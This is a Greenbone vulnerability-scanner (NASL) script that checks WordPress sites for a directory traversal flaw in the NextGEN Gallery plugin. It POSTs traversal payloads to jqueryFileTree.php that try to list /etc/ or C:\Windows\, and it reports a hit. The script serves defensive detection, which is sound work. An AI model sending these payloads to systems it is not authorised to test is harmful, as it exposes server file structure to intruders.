# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804510");
  script_version("2023-07-27T05:05:09+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:09 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-03-07 17:46:21 +0530 (Fri, 07 Mar 2014)");
  script_name("WordPress NextGEN Gallery 'jqueryFileTree.php' Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"WordPress NextGEN Gallery Plugin is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
  local directory list or not.");

  script_tag(name:"insight", value:"Flaw is due to the 'jquery.filetree/connectors/jqueryFileTree.php' script not
  properly sanitizing user input, specifically absolute paths passed via 'file' POST parameters.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to read arbitrary file
  details on the target system.");

  script_tag(name:"affected", value:"WordPress NextGEN Gallery Plugin version 2.0.0, Other versions may also be
  affected.");

  script_tag(name:"solution", value:"Update to WordPress NextGEN Gallery version 2.0.7 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125285");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65637");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Feb/171");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39100/");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://wordpress.org/plugins/nextgen-gallery");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/nextgen-gallery/products/photocrati_nextgen" +
            "/modules/nextgen_addgallery_page/static/jquery.filetree/connect" +
            "ors/jqueryFileTree.php";

useragent = http_get_user_agent();

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

foreach postdata (make_list("dir=%2Fetc%2F", "dir=C%3A%5CWindows%5C")) {

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent: ", useragent, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postdata), "\r\n\r\n",
                postdata);
  res = http_keepalive_send_recv(port:port, data:req);

  if("/etc/init" >< res || "C:\Windows\system32" >< res) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
